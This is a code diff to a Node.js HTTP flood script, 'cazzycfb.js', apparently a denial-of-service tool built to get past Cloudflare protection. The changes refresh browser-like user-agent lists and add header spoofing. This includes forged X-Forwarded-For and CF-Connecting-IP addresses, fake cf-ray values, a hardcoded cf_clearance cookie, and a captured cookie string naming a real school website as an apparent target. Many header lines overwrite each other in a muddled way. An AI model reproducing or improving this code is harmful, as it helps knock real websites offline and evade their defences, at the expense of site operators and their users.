@@ -221,51 +221,52 @@ if (process.argv.length < 7){console.log(`[!] node cazzycfb.js <HOST> <TIME> <RP
      return elements[randomIntn(0, elements.length)];
  } 
  
- function randstr(length) {
-   const characters =
-     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-   let result = "";
-   const charactersLength = characters.length;
-   for (let i = 0; i < length; i++) {
-     result += characters.charAt(Math.floor(Math.random() * charactersLength));
-   }
-   return result;
- }
+function randstr(length) {
+  let randomString = '';
+  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; 
+  const charactersLength = characters.length; 
+  
+  for (let i = 0; i < length; i++) {
+    randomString += characters.charAt(Math.floor(Math.random() * charactersLength));
+  }
+  
+  return randomString;
+}                               
 
   function randomHeaders() {
     const userAgents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
-        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36", 
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",  
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:109.0) Gecko/20100101 Firefox/117.0",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-        "Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
-        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/120.0.0.0 Mobile Safari/537.36",
-        "Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36 OPR/38.0.2220.41",
-        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-        "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Safari/537.36", 
-        "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Safari/537.36", 
-        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Safari/537.36", 
-        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Safari/537.36", 
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Safari/537.36", 
-        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0", 
-        "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Safari/537.36", 
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15", 
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Safari/537.36", 
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Safari/537.36 Edg/124.0.2478.51", 
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1", 
-        "Mozilla/5.0 (Linux; Android 16; SM-S999N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Mobile Safari/537.36", 
-        "Mozilla/5.0 (Linux; Android 15; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Mobile Safari/537.36", 
-        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)", 
-        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"  
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
+  "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36", 
+  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",  
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:109.0) Gecko/20100101 Firefox/117.0",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+  "Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/120.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36 OPR/38.0.2220.41",
+  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+  "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Safari/537.36", 
+  "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Safari/537.36", 
+  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Safari/537.36", 
+  "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Safari/537.36", 
+  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Safari/537.36", 
+  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0", 
+  "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Safari/537.36", 
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15", 
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Safari/537.36", 
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Safari/537.36 Edg/124.0.2478.51", 
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1", 
+  "Mozilla/5.0 (Linux; Android 16; SM-S999N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Mobile Safari/537.36", 
+  "Mozilla/5.0 (Linux; Android 15; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.93 Mobile Safari/537.36", 
+  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+  "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
 
     ];
     
@@ -396,6 +397,7 @@ if (process.argv.length < 7){console.log(`[!] node cazzycfb.js <HOST> <TIME> <RP
                        "*",
                        "text/css,*/*;q=0.1",
                        'Sec-Fetch-Mode: cors',
+                       'Priority: u=0, i',
                        'br',
                        'Sec-Fetch-Site: same-origin',
                        'TE: trailers',
@@ -417,6 +419,7 @@ if (process.argv.length < 7){console.log(`[!] node cazzycfb.js <HOST> <TIME> <RP
                        'Content-Type: text/plain;charset=UTF-8',
                        'Connection: keep-alive',
                        'Accept: */*',
+                       'alt-svc: h3=":443"; ma=86400',
                        'alt-svc: h3=":443"; ma=86400',
                        'Accept-Language: en-US,en;q=0.5',
                        'Accept-Encoding: gzip, deflate, br, zstd',
@@ -987,6 +990,7 @@ const spoofed1 = ip_spoof1();
 
  const accept_header = [
 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
 "text/css,*/*;q=0.1",
 "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
 "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
@@ -1591,6 +1595,7 @@ const control_header = [
                        "Access-Control-Allow-Origin: *", 
                        "X-Content-Duration: 3600", 
                        "Alt-Svc: h3=\":443\"", 
+                       'alt-svc: h3=":443"; ma=86400',
                        "X-XSS-Protection: 1; mode=block", 
                        "Referrer-Policy: no-referrer", 
                        "X-Pingback: /xmlrpc.php", 
@@ -2061,6 +2066,7 @@ const control_header = [
  ].join(":");
 
 const uap = [
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36",
   "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36",
   "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
@@ -3878,9 +3884,12 @@ const dest = [
  headers[":authority"] = parsedTarget.host;
  headers["x-forwarded-proto"] = "https";
  headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(15);
+ headers[":path"] = "/";
  headers[":scheme"] = "https";
  headers["alt-svc"] = 'h3=":443"; ma=86400';
+ headers["Alt-Svc"] = 'h3=":443"; ma=86400';
  headers["cache-control"] = "max-age=7200";
+ headers["Cache-Control"] = "max-age=7200";
  headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
  headers[":path"] = parsedTarget.path
  headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
@@ -3890,8 +3899,10 @@ const dest = [
  headers[":authority"] = parsedTarget.host;
  headers["origin"] = parsedTarget.host;
  headers["Content-Type"] = randomHeaders['Content-Type'];
+ headers["cache-control"] = "max-age=0";
  headers["TE"] = "trailers";
  headers["content-type"] = "text/html";
+ headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
  headers["server-timing"] = 'cfL4;desc="?proto=TCP&rtt=120121&min_rtt=101230&rtt_var=5991&sent=131&recv=69&lost=0&retrans=0&sent_bytes=95825&recv_bytes=6680&delivery_rate=248854&cwnd=257&unsent_bytes=0&cid=415d4a0967d2d4d7&ts=81255&x=0"';
  headers[":scheme"] = "https";
  headers["x-download-options"] = randomHeaders['x-download-options'];
@@ -3929,6 +3940,7 @@ const dest = [
  headers["CF-Connecting-IP"] = spoofed1;
  headers["CF-RAY"] = "randomRayValue";
  headers["cf-ray"] = "randomRayValue";
+ headers["cf-ray"] = "948348ffe847e88a-HKG";
  headers["CF-RAY"] = "945cbef1d87672ce-HKG"; 
  headers["cf-ray"] = "947f742e0c855def-HKG";
  headers["cf-ray"] = "945cbef1d87672ce-HKG";
@@ -3937,6 +3949,10 @@ const dest = [
  headers["cf-ray"] = "947f742e0c855def-HKG";
  headers["cf-ray"] = "945cbef299ce72ce-HKG"; 
  headers["cf-ray"] = "945cbef41c8772ce-HKG"; 
+ headers["Cf-Ray"] = "948365decb9e06ff-HKG"; 
+ headers["accept-language"] = "en-US,en;q=0.9"; 
+ headers["Priority"] = "u=2";
+ headers["Priority"] = "u=0, i";
  headers["accept-ranges"] = "bytes";
  headers["CF-Visitor"] = "{'scheme':'https'}";
  headers["Accept"] = "text/css,*/*;q=0.1";
@@ -3945,8 +3961,11 @@ const dest = [
  headers["X-Forwarded-For"] = spoofed
  headers[":authority"] = parsedTarget.host;
  headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
+ headers[":path"] = "/";
  headers[":scheme"] = "https";
  headers["x-forwarded-proto"] = "https";
+ headers["cache-control"] = "max-age=7200";
+ headers["content-encoding"] = "zstd";
  headers["cache-control"] = "no-cache";
  headers["X-Forwarded-For"] = spoofed;
  headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
@@ -3994,7 +4013,8 @@ const dest = [
  headers['Max-Forwards'] = '10';
  headers.pragma = 'no-cache';
  headers.pragma = "no-cache, akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace";
- headers.Cookie = 'cf_clearance=mOvsqA7JGiSddvLfrKvg0VQ4ARYRoOK9qmQZ7xTjC9g-1698947194-0-1-67ed94c7.1e69758c.36e830ad-250.2.1698947194'; 
+ headers.Cookie = 'cf_clearance=mOvsqA7JGiSddvLfrKvg0VQ4ARYRoOK9qmQZ7xTjC9g-1698947194-0-1-67ed94c7.1e69758c.36e830ad-250.2.1698947194';
+ headers.Cookie = "_ga_5BNN2065TL=GS2.1.s1748660772$o15$g1$t1748660964$j58$l0$h0; _ga=GA1.1.1589939676.1722590460; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-05-31%2001%3A58%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fdbtc-cebu.edu.ph%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-05-31%2001%3A58%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fdbtc-cebu.edu.ph%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%…tct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A139.0%29%20Gecko%2F20100101%20Firefox%2F139.0; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdbtc-cebu.edu.ph%2F"; 
  headers["Real-IP"] = spoofed;
  headers["referer"] = Ref;
  headers[":authority"] = parsedTarget.host + ":80"; // Include port 80 in :authority header
@@ -4009,6 +4029,7 @@ const dest = [
  headers['X-Forwarded-For'] = spoofed;
  headers["cache-control"] = control;
  headers["sec-ch-ua"] = "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"";
+ headers["sec-ch-ua"] = '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"';
  versi;
  headers["sec-ch-ua-mobile"] = sechuas[Math.floor(Math.random() * sechuas.length)];
  headers["sec-ch-ua-platform"] = browsers[Math.floor(Math.random() * browsers.length)] + platform1;
@@ -4030,6 +4051,21 @@ const dest = [
  headers.push({ "Alt-Svc": "http/1.1=http2." + parsedTarget.host + parsedTarget.path + ":443; ma=7200" });
  headers.push({ "Alt-Svc": "http/1.2=http2." + parsedTarget.host + parsedTarget.path + ":443; ma=7200" });
  headers.push({ "Alt-Svc": "http/2=http2." + parsedTarget.host + parsedTarget.path + ":443; ma=7200" });
+ headers.push({ "Alt-Svc": "http/1.1=" + parsedTarget.host + "; ma=86400" }); // Add the http/1.1 header
+ headers.push({ "Alt-Svc": "http/1.2=" + parsedTarget.host + "; ma=86400" }); // Add the http/1.2 header
+ headers.push({ "Alt-Svc": "http/2=" + parsedTarget.host + "; ma=86400" }); // Add the http/2 header 
+ headers.push({ "Alt-Svc": "http/1.1=http2." + parsedTarget.host + ":80; ma=86400" }); // Add the http/1.1 header with port 80
+ headers.push({ "Alt-Svc": "http/1.2=http2." + parsedTarget.host + ":80; ma=86400" }); // Add the http/1.2 header with port 80
+ headers.push({ "Alt-Svc": "http/2=http2." + parsedTarget.host + ":80; ma=86400" }); // Add the http/2 header with port 80
+ headers.push({ "Alt-Svc": "http/1.1=" + parsedTarget.host + ":443; ma=86400" }); // Add the http/1.1 header with port 443
+ headers.push({ "Alt-Svc": "http/1.2=" + parsedTarget.host + ":443; ma=86400" }); // Add the http/1.2 header with port 443
+ headers.push({ "Alt-Svc": "http/2=" + parsedTarget.host + ":443; ma=86400" }); // Add the http/2 header with port 443  
+ headers.push({ "Alt-Svc": "http/1.1=http2." + parsedTarget.host + parsedTarget.path + ":80; ma=86400" });
+ headers.push({ "Alt-Svc": "http/1.2=http2." + parsedTarget.host + parsedTarget.path + ":80; ma=86400" });
+ headers.push({ "Alt-Svc": "http/2=http2." + parsedTarget.host + parsedTarget.path + ":80; ma=86400" });
+ headers.push({ "Alt-Svc": "http/1.1=http2." + parsedTarget.host + parsedTarget.path + ":443; ma=86400" });
+ headers.push({ "Alt-Svc": "http/1.2=http2." + parsedTarget.host + parsedTarget.path + ":443; ma=86400" });
+ headers.push({ "Alt-Svc": "http/2=http2." + parsedTarget.host + parsedTarget.path + ":443; ma=86400" });
  headers[":authority"] = parsedTarget.host;
  headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
  headers[":scheme"] = "https";
@@ -4037,6 +4073,7 @@ const dest = [
  headers["cache-control"] = "no-cache";
  headers["X-Forwarded-For"] = spoofed;
  headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
+ headers["sec-ch-ua"] = '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"'; 
  headers["sec-ch-ua-mobile"] = "?0";
  headers["sec-ch-ua-platform"] = "Windows";
  headers["accept-language"] = lang; 
@@ -4081,6 +4118,7 @@ const dest = [
  headers["TE"] = "trailers";
  headers["accept-language"] = "en-US,en;q=0.9";
  headers["cache-control"] = "no-cache";
+ headers["cache-control"] = "private, no-cache, no-store, must-revalidate";
  headers["connection"] = "keep-alive";
  headers['Max-Forwards'] = '10';
  headers["pragma"] = "no-cache"; 
